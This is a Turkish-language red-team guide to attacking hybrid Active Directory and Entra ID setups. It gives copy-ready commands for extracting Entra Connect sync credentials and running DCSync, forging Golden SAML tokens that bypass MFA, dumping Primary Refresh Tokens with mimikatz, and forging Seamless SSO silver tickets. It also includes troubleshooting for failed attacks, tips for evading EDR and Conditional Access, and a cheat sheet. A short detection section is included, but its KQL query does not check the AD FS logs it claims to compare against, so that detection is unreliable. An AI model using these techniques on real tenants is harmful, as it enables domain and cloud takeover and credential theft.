## 1. Kavramsal Temel — Neden Var?

Modern kurumsal ortamlarda Active Directory altyapısı izole bir ada değildir. Şirketler e-posta, dosya paylaşımı ve iş uygulamaları için **Microsoft Entra ID (eski adıyla Azure AD)** ve Microsoft 365 bulut ekosistemine entegre olmuştur. Şirket içi (on-premises) dizin ile bulut dizini arasındaki köprü **Microsoft Entra Connect (veya Cloud Sync)** sunucuları üzerinden kurulur.

Bu hibrit entegrasyon, saldırganlar için **çift yönlü bir sıçrama (pivot) alanı** oluşturur:
1. **On-Prem $\rightarrow$ Cloud (Buluta Yükselme):** Şirket içi etki alanı yöneticisi haklarına ulaşan bir saldırgan, Entra Connect sunucusunu ele geçirerek veya AD FS token imzalama sertifikasını çalarak doğrudan bulut kiracısında (tenant) **Global Administrator** seviyesine yükselebilir.
2. **Cloud $\rightarrow$ On-Prem (Yerele İnme):** Bulut ortamında ele geçirilen bir hesap veya yetkili rol (Intune Administrator, Hybrid Identity Administrator), şirket içi sunucularda komut çalıştırmak veya senkronizasyon hesaplarını manipüle etmek için kullanılabilir.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 ON-PREM ↔ BULUT (ENTRA ID) HİBRİT PİVOT AKIŞI               │
└─────────────────────────────────────────────────────────────────────────────┘

  [ŞİRKET İÇİ ETKİ ALANI (ON-PREMISES)]                  [BULUT KİRACISI (ENTRA ID)]
           │                                                           │
           │ 1. Entra Connect Sunucusuna Yerel Yönetici Erişimi        │
           │    (Genellikle Tier-1 sunucu gibi zayıf korunur!)         │
           │                                                           │
           │ 2. AADInternals ile ADSync Veritabanını Deşifre Et        │
           │    - On-Prem MSOL_xxxxxxxx Hesabı (DCSync Yetkili)        │
           │    - Bulut Directory Sync Account (Sync_*) Token'ı        │
           │                                                           │
           │ 3. İki Yönlü Yetki Kazanımı                               │
           ├──────────────────────────────┬───────────────────────────►│
           │                              │                            │
           ▼                              ▼                            ▼
  [On-Prem Hakimiyeti]         [Bulut Senkronizasyon]      [Bulut Hakimiyeti]
  MSOL_ hesabı ile canlı       Parola ve grup eşitlemesini  Bulutta yeni Global Admin
  DCSync (krbtgt hasadı)       yönlendir, arka kapı ekle   tanımla veya rol ata
```

## 2. Teknik Derinlik — Hibrit Kimlik Modelleri ve Saldırı Vektörleri

### 2.1 Üç Hibrit Doğrulama Modeli ve Saldırı Yüzeyi

| Kimlik Modeli | Çalışma Prensibi | Kırmızı Takım Saldırı Yüzeyi | Savunma Önlemi |
|---|---|---|---|
| **PHS (Password Hash Sync)** | Parola NT karmasının SHA-256 karması buluta eşitlenir. | Connect sunucusundan `MSOL_` hesabı şifresini çözerek şirket içinde **DCSync** yapmak; bulut sync token'ı ile tenant'a yazmak. | Entra Connect'i Tier-0 kabul etmek. |
| **PTA (Pass-Through Auth)** | Doğrulama şirket içi Authentication Agent'a iletilir. | Agent sunucusunda `spoolsv`/LSASS veya DLL injection ile **canlı parolaları bellekten yakalamak**. | Agent sunucularını Tier-0 sıkılaştırmak. |
| **Federation (AD FS)** | Kimlik doğrulamayı şirket içi AD FS yapar, SAML token üretir. | Token-signing özel anahtarını çalarak **Golden SAML** ile herhangi bir kullanıcı adına MFA'sız token basmak. | AD FS sunucusunu Tier-0 korumak, PHS'e geçiş. |

### 2.2 Entra Connect (ADSync) Veritabanı Deşifresi
Entra Connect sunucusu, yerel bir SQL LocalDB (`ADSync`) üzerinde senkronizasyon hesaplarının şifrelerini tutar. Bu veritabanı Windows **DPAPI (Data Protection API)** ve şifreli `keyset` anahtarları ile korunur.
- Yerel Administrator haklarına sahip bir saldırgan, `AADInternals` modülü (`Get-AADIntSyncCredentials`) ile DPAPI anahtarlarını çözer.
- Çıktı iki altın değerinde kimlik sunar:
  1. `MSOL_xxxxxxxxxxxx`: Şirket içi Active Directory'de etki alanı kökünde `DS-Replication-Get-Changes-All` hakkına sahip DCSync hesabı.
  2. `Sync_...`: Bulut tarafında kullanıcıların özniteliklerini ve parolalarını değiştirmeye yetkili bulut senkronizasyon hesabı.

### 2.3 Golden SAML: Bulutta Koşulsuz ve MFA'sız Kimlik Sahteciliği
AD FS kullanılan federasyon yapılarında güven zinciri şöyledir:
1. Kullanıcı AD FS'e gider; AD FS kimliği doğrular ve **Token Signing Certificate (Token İmzalama Sertifikası)** ile imzalı bir SAML Assertion üretir.
2. Kullanıcı bu SAML biletini Entra ID'ye sunar. Entra ID, sertifika imzasını doğrular ve **MFA sormadan** oturumu açar.
3. **Saldırı:** Saldırgan AD FS sunucusundaki DKM (Distributed Key Management) konteynerinden özel anahtarı (`.pfx`) çaldığında, şirket içi AD FS'e hiç uğramadan **kendi makinesinde herhangi bir kullanıcı için (Global Admin dahil) geçerli SAML bileti** üretir. Parola değişikliği bu bileti etkilemez.

### 2.4 Seamless SSO ve `AZUREADSSOACC$`
Kesintisiz SSO (Seamless Single Sign-On) aktif edildiğinde, etki alanında `AZUREADSSOACC$` adında bir bilgisayar hesabı oluşturulur. Bu hesabın Kerberos biletleri bulut doğrulaması için kullanılır. Parolası düzenli değiştirilmediğinde, NT karması kullanılarak **bulut için Silver Ticket** üretilebilir.

## 3. Pratik Uygulama — Çok Araçlı Komut Kılavuzu

### 3.1 Entra Connect Sunucusundan Kimlik Bilgilerini Çalma (AADInternals)
```powershell
# Entra Connect sunucusunda yerel Administrator olarak PowerShell açın
Import-Module AADInternals

# ADSync veritabanındaki şifrelenmiş kimlikleri deşifre edin
Get-AADIntSyncCredentials

# Çıktıdan dönen on-prem MSOL_ hesabını kullanarak doğrudan DCSync çalıştırın:
# secretsdump.py 'corp.local/MSOL_1234567890ab:Password@dc01.corp.local' -just-dc-user krbtgt
```

### 3.2 AD FS Üzerinden Golden SAML Saldırısı
```powershell
# 1. AD FS sunucusunda Token İmzalama Sertifikasını dışa aktarma (AADInternals)
Export-AADIntADFSSigningCertificate -Path C:\Windows\Temp\signing.pfx

# 2. Saldırgan makinesinde herhangi bir kullanıcı (Global Admin) için sahte SAML token üretme
$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2("signing.pfx", "parola")
New-AADIntSAMLToken -ImmutableId "mF4xK8..." -UserPrincipalName "ceo@corp.com" `
  -SigningCertificate $cert -Issuer "http://fs.corp.com/adfs/services/trust"
```

### 3.3 Join'li Windows Cihazından PRT (Primary Refresh Token) Hasadı
```cmd
:: Windows 10/11 Entra Hybrid-Joined istemcide Mimikatz ile CloudAP oturumunu çekin
mimikatz.exe
privilege::debug
sekurlsa::cloudap
exit
```

```bash
# Linux ortamında ROADtx kullanarak PRT ile bulut oturumu açma
roadtx browserprtauth --prt <PRT_Değeri> --prt-sessionkey <Oturum_Anahtarı>
```

### 3.4 ROADtools ile Bulut Kiracısını Haritalama (roadrecon)
```bash
# Bulut kimlik bilgilerini kullanarak tüm tenant nesnelerini yerel veritabanına çekme
roadrecon gather -u "victim@corp.onmicrosoft.com" -p "Password123!"

# Keşif GUI arayüzünü başlatma
roadrecon gui
```

### 3.5 Seamless SSO ile Silver Ticket Üretme
```bash
# AZUREADSSOACC$ hesabı hash'i ile bulut SPN'i için bilet üretme
impacket-ticketer -nthash <AZUREADSSOACC$_NTHash> \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  -spn HTTP/autologon.microsoftazuread-sso.com \
  Administrator
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Durum | Teknik Neden | Çözüm / Yaklaşım |
|---|---|---|
| `AADInternals: Error opening ADSync database` | PowerShell oturumu SQL LocalDB örneğine erişebilecek yerel yönetici ayrıcalığına sahip değildir. | PowerShell konsolunu "Run as Administrator" olarak açın veya `NT AUTHORITY\SYSTEM` bağlamında çalıştırın. |
| `DPAPI Decrypt Failed (mcrypt keyset)` | DPAPI anahtarları oturum bağlamıyla uyuşmamaktadır; ADSync servis hesabının yetkileri gereklidir. | Mimikatz veya PowerShell ile doğrudan ADSync Windows servis hesabının token'ını taklit edin (`incognito` veya `tokenvator`). |
| `Golden SAML: AADSTS50008: SAML token is invalid` | SAML biletindeki Issuer URI, ImmutableID formatı veya token geçerlilik süresi Entra ID yapılandırmasıyla eşleşmemektedir. | `Get-MsolDomainFederationSettings -DomainName corp.com` ile Issuer URI ve imza algoritmasını doğrulayın; ImmutableID'nin doğru Base64 GUID olduğunu teyit edin. |
| `Seamless SSO Ticket Rejected` | `AZUREADSSOACC$` makine hesabının parolası Microsoft tarafından otomatik yenilenmiştir (30 günde bir önerilen rotasyon). | DC üzerinden `AZUREADSSOACC$` hesabının güncel NT karmasını yeniden çekin ve bileti güncelleyin. |
| `PRT CloudAP Extraction Empty / TPM Protected` | Cihazda Virtualization-Based Security (VBS) veya TPM donanım koruması aktiftir; PRT anahtarı belleğe açık düşmez. | Ham anahtar çıkarma yerine yerel tarayıcı SSO enjeksiyonu (`roadtx`) veya WAM API çağrılarını kullanın. |
| `Conditional Access: Restricted Location / Blocked` | Entra ID Koşullu Erişim (Conditional Access) politikası oturumu coğrafi konum veya uyumlu olmayan cihaz nedeniyle engellemektedir. | VPN/Proxy ile kurumun güvenilen dış IP bloğuna geçin veya hibrit cihaz iddialarını (Device Claim) bilet içine dahil edin. |

## 5. Bıraktığı İz, Karşı Tespit ve Tehdit Avcılığı

### 5.1 Olay Günlükleri Analiz Matrisi

| Olay Kimliği / Günlük | Günlük Kaynağı | Anlamı ve Tespit Sinyali |
|---|---|---|
| **Event ID 4662** | Security (On-Prem DC) | **MSOL_ Hesabı DCSync:** `MSOL_` hesabının olağandışı saatlerde veya anormal IP'lerden replikasyon çağırması. |
| **Event ID 500 & 501** | AD FS Denetim Günlüğü | **AD FS İmzalama Sertifikası Erişimi:** Token imzalama anahtarının dışa aktarılması veya yetkisiz okunması. |
| **Entra Sign-in Logs** | Azure Portal / Sentinel | **Golden SAML Anomalisi:** AD FS sunucusunda hiçbir oturum kaydı yokken bulutta SAML ile doğrudan başarılı oturum açılması (MFA'sız). |
| **Entra Audit Logs** | Azure Portal / Sentinel | **Kritik Rol Ataması:** Bulut senkronizasyon hesabı kullanılarak veya aniden yeni bir Global Admin eklenmesi. |

### 5.2 MITRE ATT&CK Eşleştirmesi
- **Taktik:** Privilege Escalation (TA0004), Defense Evasion (TA0005), Credential Access (TA0006)
- **Teknik:** Forge Web Credentials: SAML / Golden SAML ([T1606.002](https://attack.mitre.org/techniques/T1606/002/))
- **İlişkili Teknik:** Valid Accounts: Cloud Accounts ([T1078.004](https://attack.mitre.org/techniques/T1078/004/)), Steal Application Access Token ([T1550.001](https://attack.mitre.org/techniques/T1550/001/))

### 5.3 OPSEC Stratejileri

| Saldırı Vektörü | Tespit Riski | OPSEC Karşı Önlemi |
|---|---|---|
| **Get-AADIntSyncCredentials** | **Yüksek** | Entra Connect sunucusundaki EDR yazılımları DPAPI deşifre fonksiyonlarını sıkı izler. İşlemi mesai dışı ve bellekte icra edin. |
| **Golden SAML** | **Düşük-Orta** | On-prem AD FS'e hiç gitmediği için şirket içinde iz bırakmaz; ancak buluttaki oturum açma IP'si kurum dışı görünürse Conditional Access'e takılır. |
| **PRT Hasadı** | **Orta** | LSASS sürecinden `cloudap` okumak Sysmon ve EDR tarafından tespit edilebilir. |

### 5.4 SIEM ve Tehdit Avcılığı Kuralları

**KQL Sorgusu (Microsoft Sentinel — AD FS Kaydı Olmayan Şüpheli SAML Oturumu):**
```kusto
// Bulutta federasyonla oturum açılmış fakat AD FS günlüklerinde eşleşen başarılı Event ID bulunmayan durumlar (Golden SAML)
let CloudLogons = SigninLogs
| where TimeGenerated >= ago(1d)
| where AuthenticationType == "Federated" and ResultType == 0
| project TimeGenerated, UserPrincipalName, IPAddress, Location, UserAgent;
CloudLogons
| where UserPrincipalName has_any ("admin@", "ceo@", "director@")
| project TimeGenerated, UserPrincipalName, IPAddress, Location
```

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# Komut 1: Entra Connect sunucusundan MSOL ve bulut Sync hesaplarını çekme
Get-AADIntSyncCredentials
```
* **Ne Yapar?:** Entra Connect sunucusundaki SQL veritabanından şirket içi DCSync yetkili `MSOL_` hesabı ile bulut senkronizasyon token'ını deşifre eder.
* **Ne Zaman Kullanılır?:** Entra Connect sunucusuna erişim sağlandığında anında hem on-prem hem bulut Tier-0 yetkisi kazanmak için.
* **Parametreler:** Parametresiz çalışır; yerel yönetici ayrıcalıkları gerektirir.

```powershell
# Komut 2: AD FS sunucusundan token imzalama sertifikasını PFX olarak dışa aktarma
Export-AADIntADFSSigningCertificate -Path C:\Windows\Temp\signing.pfx
```
* **Ne Yapar?:** AD FS DKM konteynerindeki gizli özel anahtarı ve sertifikayı dışa aktararak diske kaydeder.
* **Ne Zaman Kullanılır?:** Golden SAML saldırısı hazırlığında imzalama anahtarını elde etmek için.
* **Parametreler:** `-Path`: Sertifikanın kaydedileceği dosya yolu.

```powershell
# Komut 3: Golden SAML ile herhangi bir kullanıcı adına sahte bulut erişim bileti üretme
New-AADIntSAMLToken -ImmutableId "mF4xK8==" -UserPrincipalName "victim@corp.com" -SigningCertificate $cert -Issuer "http://fs.corp.com/adfs/services/trust"
```
* **Ne Yapar?:** Çalınan token-signing sertifikası ile imzalanmış, MFA'yı tamamen baypas eden sahte bir SAML assertion oluşturur.
* **Ne Zaman Kullanılır?:** AD FS'e hiç uğramadan bulut kiracısında istenen hesap olarak doğrudan oturum açmak için.
* **Parametreler:** `-ImmutableId`: Kullanıcının nesne GUID değeri; `-UserPrincipalName`: Hedef bulut hesabı; `-SigningCertificate`: Özel anahtar.

```bash
# Komut 4: ROADtools ile Entra ID dizin verilerini yerel SQLite veritabanına indirme
roadrecon gather -u "admin@corp.onmicrosoft.com" -p "Password123!"
```
* **Ne Yapar?:** Microsoft Graph API üzerinden hedef kiracıdaki tüm kullanıcıları, grupları, cihazları ve rolleri çeker.
* **Ne Zaman Kullanılır?:** Bulut saldırı yüzeyini, ayrıcalıklı rolleri ve yetki yükseltme yollarını çevrimdışı analiz etmek için.
* **Parametreler:** `-u`: Bulut kullanıcı adı; `-p`: Parola.

```cmd
:: Komut 5: Mimikatz ile cihaz belleğindeki Primary Refresh Token (PRT) verisini çekme
mimikatz.exe "privilege::debug" "sekurlsa::cloudap" exit
```
* **Ne Yapar?:** Windows CloudAP kimlik sağlayıcısının bellekte tuttuğu PRT değerini ve TPM türetilmiş oturum anahtarını döker.
* **Ne Zaman Kullanılır?:** Hibrit katılmış bir iş istasyonunda kullanıcının mevcut bulut SSO oturumunu çalmak için.
* **Parametreler:** `sekurlsa::cloudap`: CloudAP oturum bilgilerini ayrıştırır.

```bash
# Komut 6: Seamless SSO hesabının NT hash'i ile bulut Silver Ticket üretme
impacket-ticketer -nthash <AZUREADSSOACC$_Hash> -domain-sid <Domain_SID> -domain corp.local -spn HTTP/autologon.microsoftazuread-sso.com Administrator
```
* **Ne Yapar?:** Kesintisiz SSO makine hesabı hash'ini kullanarak doğrudan bulut kimlik doğrulama uç noktası için Kerberos bileti oluşturur.
* **Ne Zaman Kullanılır?:** Kullanıcı parolası bilmeksizin şirket içi ağdan buluta kesintisiz SSO bileti ile sızmak için.
* **Parametreler:** `-spn`: Seamless SSO resmi hizmet adı.
